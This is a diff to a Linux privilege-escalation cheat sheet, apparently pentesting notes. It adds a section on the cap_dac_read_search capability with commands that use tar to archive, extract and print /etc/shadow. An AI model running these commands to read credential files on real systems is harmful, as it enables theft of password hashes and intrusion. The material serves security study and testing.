@@ -10,6 +10,16 @@ Similar vector to SUID bit being set. If capabilities are set, it will run from 
 getcap -r / 2>/dev/null
 ```
 Then go check [GTFOBins](https://gtfobins.github.io) like you would for the SUID bit.
+#### cap_dac_read_search
+```bash
+# Output you want:
+# cap_dac_read_search+ep
+# This will allow you to read files on the filesystem as root, so go to GTFObins and do a file read with whatever program comes out if different that the tar show below.
+# If tar has this capability:
+tar cf shadow.tar /etc/shadow
+tar xf shadow.tar
+cat /etc/shadow
+```
 #### Resources
 - [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
 - [SUID v Capabilities](https://mn3m.info/posts/suid-vs-capabilities/)
